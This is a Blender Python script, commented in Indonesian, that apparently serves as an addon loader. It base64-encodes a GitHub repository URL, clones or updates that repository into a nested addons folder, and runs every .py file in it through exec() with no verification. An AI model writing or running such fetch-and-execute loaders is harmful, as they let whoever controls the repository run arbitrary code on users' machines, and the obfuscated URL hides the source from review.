import bpy
import os
import subprocess
import base64

# --- SETUP LOKASI ---

# Path ke direktori user (misalnya: C:/Users/NamaUser)
USER_FOLDER = os.path.expanduser("~")

# Ambil dua angka pertama dari versi Blender (misalnya: "4.2")
BLENDER_VERSION = ".".join(map(str, bpy.app.version[:2]))

# Lokasi target tempat menyimpan addon yang di-clone
ADDON_DIR = os.path.join(
    USER_FOLDER,
    "AppData", "Roaming", "Blender Foundation", "Blender",
    BLENDER_VERSION, "scripts", "addons", "_pyc_", "MAIN", "B4"
)

# Buat folder jika belum ada
if not os.path.exists(ADDON_DIR):
    os.makedirs(ADDON_DIR, exist_ok=True)

# --- BASE64: Nama Folder & URL ---

# Nama folder hasil clone: "RR-T-B.4_V04"
ENCODED_FOLDER = "UlItVC1CLjRfVjA0"
EXTRACT_FOLDER = os.path.join(ADDON_DIR, base64.b64decode(ENCODED_FOLDER).decode("utf-8"))

# URL GitHub: "https://github.com/rrstudiodevelopment/RR-T-B.4_V04"
ENCODED_REPO = "aHR0cHM6Ly9naXRodWIuY29tL3Jyc3R1ZGlvZGV2ZWxvcG1lbnQvUlItVC1CLjRfVjA0"
GITHUB_REPO = base64.b64decode(ENCODED_REPO).decode("utf-8")

# --- FUNGSI CLONE REPOSITORY ---

def clone_repository():
    """Clone atau update repository dari GitHub"""
    try:
        if os.path.exists(EXTRACT_FOLDER):
            print(f"Repository sudah ada. Melakukan update di: {EXTRACT_FOLDER}")
            subprocess.run(["git", "-C", EXTRACT_FOLDER, "pull"], check=True)
        else:
            print(f"Meng-clone repository ke: {EXTRACT_FOLDER}")
            subprocess.run(["git", "clone", GITHUB_REPO, EXTRACT_FOLDER], check=True)

        print("Repository berhasil di-clone atau diperbarui.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Terjadi kesalahan saat clone/pull repository:\n{e}")
        return False

# --- FUNGSI EKSEKUSI SEMUA SCRIPT ---

def execute_all_scripts():
    """Menjalankan semua file .py dalam folder hasil clone"""
    if os.path.exists(EXTRACT_FOLDER):
        print(f"Menjalankan semua script dari: {EXTRACT_FOLDER}")
        for file in os.listdir(EXTRACT_FOLDER):
            if file.endswith(".py"):
                script_path = os.path.join(EXTRACT_FOLDER, file)
                try:
                    print(f"Menjalankan: {file}")
                    with open(script_path, "r", encoding="utf-8") as script:
                        exec(script.read(), globals())
                    print(f"Berhasil menjalankan: {file}")
                except Exception as e:
                    print(f"❌ Gagal menjalankan {file}:\n{e}")
    else:
        print("❌ Folder hasil clone tidak ditemukan!")

# --- EKSEKUSI UTAMA ---

if clone_repository():
    execute_all_scripts()
